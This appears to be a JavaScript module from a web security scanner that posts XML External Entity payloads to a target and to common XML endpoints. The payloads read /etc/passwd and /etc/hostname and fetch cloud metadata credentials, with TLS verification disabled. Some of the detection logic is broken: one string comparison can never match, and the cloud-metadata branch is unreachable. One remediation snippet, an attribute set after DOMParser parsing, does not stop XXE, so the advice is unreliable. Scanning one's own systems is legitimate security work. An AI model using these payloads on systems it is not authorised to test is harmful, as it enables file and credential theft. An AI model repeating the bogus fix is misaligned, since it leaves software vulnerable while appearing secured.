const https = require("https");
const http  = require("http");
const { URL } = require("url");

const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

const XXE_PAYLOADS = [
  `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>`,
  `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
  `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>`,
];

const COMMON_XML_ENDPOINTS = ["/api/xml", "/api/soap", "/api/parse", "/ws", "/soap",
                              "/xmlrpc", "/api/upload", "/api/import", "/rss"];

function sendXML(url, xml, timeout = 10000) {
  return new Promise((resolve) => {
    try {
      const parsed = new URL(url);
      const lib    = parsed.protocol === "https:" ? https : http;
      const opts = {
        hostname: parsed.hostname,
        port: parsed.port || (parsed.protocol === "https:" ? 443 : 80),
        path: parsed.pathname + parsed.search,
        method: "POST",
        headers: { "Content-Type": "application/xml", "Content-Length": Buffer.byteLength(xml) },
        rejectUnauthorized: false,
        timeout,
      };
      const req = lib.request(opts, (res) => {
        let data = "";
        res.on("data", (c) => { data += c; if (data.length > 500000) req.destroy(); });
        res.on("end", () => resolve({ status: res.statusCode, body: data, headers: res.headers }));
      });
      req.on("error",   () => resolve(null));
      req.on("timeout", () => { req.destroy(); resolve(null); });
      req.write(xml);
      req.end();
    } catch { resolve(null); }
  });
}

async function testXXE(target, siteMap) {
  const result  = { name: "XXE (XML External Entity)", passed: true, issues: [] };
  const base    = target.replace(/\/$/, "");

  const endpoints = new Set([base]);
  if (siteMap?.endpoints) {
    for (const ep of siteMap.endpoints) endpoints.add(ep.replace(/\/$/, ""));
  }
  for (const ep of COMMON_XML_ENDPOINTS) endpoints.add(`${base}${ep}`);

  for (const endpoint of endpoints) {
    for (const xml of XXE_PAYLOADS) {
      try {
        const res = await sendXML(endpoint, xml);
        if (!res) continue;
        await delay(100);

        if (res.status === 200 || res.status === 500) {
          const body = res.body.toLowerCase();
          if (body.includes("root:x:0:0") || body.includes("ami-id") || 
              body.includes("computeMetadata") || body.includes("hostname")) {
            result.passed = false;
            result.issues.push({
              title:    "XXE Vulnerability Detected",
              location: `POST ${endpoint}`,
              detail:   `Server processed external entity and returned sensitive file/URL content.`,
              severity: "CRITICAL",
              risk:     "Attackers can read any file on the server or make internal SSRF requests via XML entities.",
              fixes: [
                { label: "Disable external entity processing",
                  code:  "// ❌ VULNERABLE — default XML parser allows external entities\nconst parser = new xml2js.Parser();\n\n// ✅ SAFE — disable all external entities\nconst libxml = require('libxmljs2');\nconst doc = libxml.parseXml(userXml, {\n  noent: false,       // no entity expansion\n  dtdload: false,     // no DTD loading\n  nonet: true         // no network access\n});" },
                { label: "Prefer JSON over XML where possible",
                  code:  "Switching to JSON eliminates XXE risk entirely:\napp.use(express.json());\napp.post('/api/data', (req, res) => {\n  const data = req.body;\n  // process data safely\n});" }
              ]
            });
            break;
          }

          if (xml.includes("169.254") && (body.includes("ami-id") || body.includes("security-credentials"))) {
            result.passed = false;
            result.issues.push({
              title:    "XXE — SSRF via Cloud Metadata",
              location: `POST ${endpoint}`,
              detail:   "Server fetched AWS/GCP cloud metadata via XXE — cloud credentials at risk.",
              severity: "CRITICAL",
              risk:     "Attackers can steal cloud IAM credentials and compromise your entire cloud infrastructure.",
              fixes: [
                { label: "Block outbound XML entity resolution",
                  code:  "// Disable DOCTYPE declaration entirely\nconst parser = new DOMParser();\nconst doc = parser.parseFromString(xml, 'text/xml');\ndoc.documentElement.setAttribute('xmlns:xxe', '');" }
              ]
            });
            break;
          }
        }
      } catch { }
    }
    if (result.issues.length > 0) break;
  }

  return result;
}

module.exports = testXXE;
